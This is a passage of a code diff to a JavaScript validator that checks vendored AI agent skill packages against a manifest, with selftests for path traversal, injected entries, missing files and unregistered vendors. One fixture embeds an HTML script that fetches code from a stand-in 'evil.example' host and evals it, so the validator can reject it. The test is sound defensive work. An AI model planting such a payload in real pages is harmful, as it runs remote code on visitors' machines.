+    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
+    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
+    expect('路径穿越声明被 PATH_TRAVERSAL 拒', !r.ok && r.errors.some((e) => e.includes('PATH_TRAVERSAL')), r.errors.join(' | '))
+  }
+
+  // --- 12. oil entry 注入 → ENTRY_SET/ENTRY_UNDECLARED 拒 ---
+  {
+    const dir = buildFixtureDir()
+    writeTree(dir, OIL)
+    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
+    man.entrySkillIds = ['oiloil-ui-ux-guide', 'injected-skill']
+    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
+    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
+    expect('oil entry 注入被 ENTRY_SET/ENTRY_UNDECLARED 拒', !r.ok && r.errors.some((e) => e.includes('ENTRY_SET') || e.includes('ENTRY_UNDECLARED')), r.errors.join(' | '))
+  }
+
+  // --- 13. html 远程脚本 → HTML_REMOTE_SCRIPT 拒 ---
+  {
+    const dir = buildFixtureDir()
+    const files = { ...OIL,
+      'skills/oiloil-ui-ux-guide/references/preview.html':
+        '<!doctype html><html><body><script src="https://cdn.example.com/x.js"></script></body></html>' }
+    writeTree(dir, files)
+    const man = makeManifest({ files, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
+    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
+    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
+    expect('html 远程脚本被 HTML_REMOTE_SCRIPT 拒', !r.ok && r.errors.some((e) => e.includes('HTML_REMOTE_SCRIPT')), r.errors.join(' | '))
+  }
+
+  // --- 14. html fetch/eval 可执行载荷 → HTML_EXEC 拒 ---
+  {
+    const dir = buildFixtureDir()
+    const files = { ...OIL,
+      'skills/oiloil-ui-ux-guide/references/preview.html':
+        '<!doctype html><html><body><script>fetch("https://evil.example/collect").then(eval)</script></body></html>' }
+    writeTree(dir, files)
+    const man = makeManifest({ files, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
+    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
+    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
+    expect('html fetch/eval 载荷被 HTML_EXEC 拒', !r.ok && r.errors.some((e) => e.includes('HTML_EXEC')), r.errors.join(' | '))
+  }
+
+  // --- 15. 声明但缺失文件 → MISSING_FILE 拒 ---
+  {
+    const dir = buildFixtureDir()
+    const files = {
+      'LICENSE.txt': 'Apache License Version 2.0 fixture\n',
+      'skills/oiloil-ui-ux-guide/SKILL.md': SKILL_MD('oiloil-ui-ux-guide'),
+    }
+    writeTree(dir, files)
+    const man = makeManifest({ files, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
+    man.skills[0].files.push({ path: 'skills/oiloil-ui-ux-guide/evals/evals.json', sha256: '0'.repeat(64), bytes: 2 })
+    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
+    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
+    expect('声明缺失文件被 MISSING_FILE 拒', !r.ok && r.errors.some((e) => e.includes('MISSING_FILE')), r.errors.join(' | '))
+  }
+
+  // --- 16. 注册 profile 目录缺失（scanVendorRoots）→ MISSING_VENDOR 拒；未注册同级目录仅留痕不阻断 ---
+  {
+    const dir = buildFixtureDir()
+    mkdirSync(join(dir, 'rogue-vendor'), { recursive: true })
+    writeTree(dir, { 'rogue-vendor/SKILL.md': '# rogue\n' })
+    const r = scanVendorRoots(dir)
+    expect('注册 profile 缺失被 MISSING_VENDOR 拒', !r.ok && r.errors.some((e) => e.includes('MISSING_VENDOR')), r.errors.join(' | '))
+    expect('未注册同级目录仅 SKIPPED_UNREGISTERED 留痕不阻断', r.notes.some((n) => n.includes('SKIPPED_UNREGISTERED') && n.includes('rogue-vendor')), r.notes.join(' | '))
   }
 
   const passed = results.filter((r) => r.cond).length
@@ -628,28 +952,31 @@ function runSelftest() {
 }
 
 // ---------------------------------------------------------------------------
-// main
+// main（仅直接执行时运行；被 test-*.mjs import 时只导出函数，不触发扫描/退出码）
 // ---------------------------------------------------------------------------
+const isDirectEntry = process.argv[1] && fileURLToPath(import.meta.url) === resolve(process.argv[1])
 const isSelftest = process.argv.includes('--selftest')
-if (isSelftest) {
+if (isDirectEntry && isSelftest) {
   runSelftest()
-} else {
-  console.log(`[verify-external-skills] vendor 根 = ${VENDOR_DIR}`)
+} else if (isDirectEntry) {
+  const AGENT_SKILLS_DIR = join(REPO, 'vendor', 'agent-skills')
+  console.log(`[verify-external-skills] 扫描目录 = ${AGENT_SKILLS_DIR}（仅显式注册 profile；未注册目录拒绝）`)
   console.log('[verify-external-skills] 只读/离线/确定性；不执行 vendored 内容、不联网、不改写任何文件')
-  const r = checkVendorRoot(VENDOR_DIR)
+  const r = scanVendorRoots(AGENT_SKILLS_DIR)
 
-  // 先打印分类留痕（F0/REF-EXTERNAL 等），再打印阻断错误
+  // 先打印分类留痕（F0/REF-EXTERNAL/HTML-URL-PASSIVE 等），再打印阻断错误
   for (const n of r.notes) console.log('  ' + n)
 
   if (!r.ok) {
     console.error(`\n[verify-external-skills] FAIL（共 ${r.errors.length} 项阻断）：`)
     for (const e of r.errors) console.error('  ✗ ' + e)
-    console.error('\n处置：vendor 已被改动 / 出现越界文件或危险指令；立即停用该 vendor skill 并报障（不得带病运行）。')
+    console.error('\n处置：vendor 已被改动 / 出现越界文件或危险指令 / 出现未注册 vendor；立即停用该 vendor skill 并报障（不得带病运行）。')
     process.exit(1)
   }
 
-  console.log(`\n[verify-external-skills] PASS`)
-  console.log(`  source commit = ${r.commit}`)
-  console.log(`  vendored 文件数 = ${r.fileCount}；entry skills = ${r.entryCount}；声明依赖 = ${r.declaredDepCount}`)
-  console.log('  所有文件 sha256/bytes 与 manifest 逐位一致；无越界文件/脚本/symlink；无 F1 危险指令。')
+  console.log(`\n[verify-external-skills] PASS（${r.perVendor.length} 个注册 vendor）`)
+  for (const v of r.perVendor) {
+    console.log(`  - ${v.vendorName}: commit=${v.commit ?? 'n/a'}；文件数=${v.fileCount}；entry=${v.entryCount}；声明依赖=${v.declaredDepCount}`)
+  }
+  console.log('  所有文件 sha256/bytes 与 manifest 逐位一致；无越界文件/脚本/symlink/远程 html 脚本；无 F1 危险指令。')
 }
